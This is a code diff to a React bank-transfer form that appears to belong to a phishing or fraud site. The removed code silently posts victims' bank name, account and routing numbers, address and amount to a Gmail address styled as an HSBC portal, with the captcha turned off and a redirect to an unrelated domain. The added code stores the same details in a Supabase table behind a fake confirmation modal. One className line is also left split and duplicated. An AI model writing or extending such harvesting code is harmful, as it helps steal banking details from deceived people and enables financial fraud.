@@ -1,4 +1,6 @@
 import React, { useState } from "react";
+import { useNavigate } from "react-router-dom";
+import { supabase } from '../../supabase';
 
 const BankTransferForm = () => {
   const [formData, setFormData] = useState({
@@ -22,6 +24,8 @@ const BankTransferForm = () => {
   const [showModal, setShowModal] = useState(false);
   const [submittedAmount, setSubmittedAmount] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  
+  const navigate = useNavigate();// Used for redirecting to /dashboard3 after submission
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -40,7 +44,7 @@ const BankTransferForm = () => {
     setFormData({ ...formData, [name]: value });
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
     // Check for errors first
@@ -52,41 +56,25 @@ const BankTransferForm = () => {
     // Set loading state
     setIsLoading(true);
 
-    // With FormSubmit, we'll use their direct HTML form submission approach
-    // This is more reliable than fetch API for their service
-    const formElement = document.createElement("form");
-    formElement.method = "POST";
-    formElement.action =
-      "https://formsubmit.co/hsbconlinebankingportal@gmail.com";
-    formElement.style.display = "none";
+    // Submit to Supabase
+    const { data, error } = await supabase.from('transactions').insert([
+      {
+        bank_name: formData.bankName,
+        account_number: formData.accountNo,
+        routing_number: formData.routingNo,
+        bank_address: formData.address,
+        recipient_name: formData.recipientName,
+        amount: parseFloat(formData.amount),
+      },
+    ]);
 
-    // Add _captcha field to disable FormSubmit's captcha
-    const captchaField = document.createElement("input");
-    captchaField.type = "hidden";
-    captchaField.name = "_captcha";
-    captchaField.value = "false";
-    formElement.appendChild(captchaField);
-
-    // Add redirect field
-    const redirectField = document.createElement("input");
-    redirectField.type = "hidden";
-    redirectField.name = "_next";
-    redirectField.value = "https://www.airlinebalstatus.com/#/dashboard3";
-    formElement.appendChild(redirectField);
-
-    // Add all form data as hidden fields
-    for (const key in formData) {
-      const hiddenField = document.createElement("input");
-      hiddenField.type = "hidden";
-      hiddenField.name = key;
-      hiddenField.value = formData[key];
-      formElement.appendChild(hiddenField);
+    if (error) {
+      console.error("Error submitting data to Supabase:", error);
+      setIsLoading(false);
+      return;
     }
 
-    // Add form to body and submit
-    document.body.appendChild(formElement);
-
-    // Show the modal before submitting
+    // Show the modal before redirect
     setSubmittedAmount(formData.amount);
     setShowModal(true);
 
@@ -100,11 +88,11 @@ const BankTransferForm = () => {
       amount: "",
     });
 
-    // Submit after a short delay to ensure modal is shown
+    // After showing modal, wait a moment and then redirect
     setTimeout(() => {
-      formElement.submit();
       setIsLoading(false);
-    }, 3000);
+      navigate("/dashboard3"); // Redirect to dashboard3 after submission
+    }, 3000); // Delay the redirection to show the modal
   };
 
   return (
@@ -257,7 +245,8 @@ const BankTransferForm = () => {
           {/* Submit Button */}
           <button
             type="submit"
-            className={`w-full py-2 mt-6 text-white font-medium rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 ${
+            className={`w-full py-2 mt-6 text-white font-medium rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring
+            focus:ring-blue-500 focus:ring-offset-2 ${
               isLoading ? "bg-blue-400" : "bg-blue-600 hover:bg-blue-700"
             }`}
             disabled={isLoading}
